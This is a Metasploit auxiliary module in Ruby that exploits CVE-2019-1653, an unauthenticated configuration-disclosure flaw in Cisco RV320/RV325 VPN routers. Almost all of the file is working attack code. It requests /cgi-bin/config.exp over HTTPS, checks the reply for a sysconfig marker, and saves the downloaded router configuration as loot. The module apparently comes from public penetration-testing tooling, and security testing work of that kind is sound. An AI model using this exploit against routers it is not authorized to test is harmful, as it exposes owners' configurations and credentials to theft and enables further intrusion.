##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  #include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Cisco RV320/RV326 Configuration Disclosure',
      'Description'  => %q{
          A vulnerability in the web-based management interface of Cisco Small Business
          RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated,
          remote attacker to retrieve sensitive information. The vulnerability is due
          to improper access controls for URLs. An attacker could exploit this
          vulnerability by connecting to an affected device via HTTP or HTTPS and
          requesting specific URLs. A successful exploit could allow the attacker to
          download the router configuration or detailed diagnostic information. Cisco
          has released firmware updates that address this vulnerability.
        },
      'References'     =>
        [
          ['EDB', '46262'],
          ['BID', '106732'],
          ['CVE', '2019-1653'],
          ['URL', 'https://seclists.org/fulldisclosure/2019/Jan/52'],
          ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
          ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
        ],
      'Author'         =>
        [
          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>'
        ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])
  end

  def run_host(ip)
    begin
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
      }, 60)
    end

    if res.nil?
      print_error("Got back an empty response.")
    elsif res.code == 200
      body = res.body
      if body.match(/####sysconfig####/)
        stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
        print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")
        report_host(host: rhost)
        #TODO: Dump hashes to database
        #TODO: Add host to database
      else
        print_error("#{rhost} - Failed!  We got back something else.")
      end
    else
      print_error("#{rhost} - Failed! The webserver issued a #{res.code} HTTP response.")
      print_error("Please validate the RHOST and TARGETURI options and try again.")
    end

  end
end
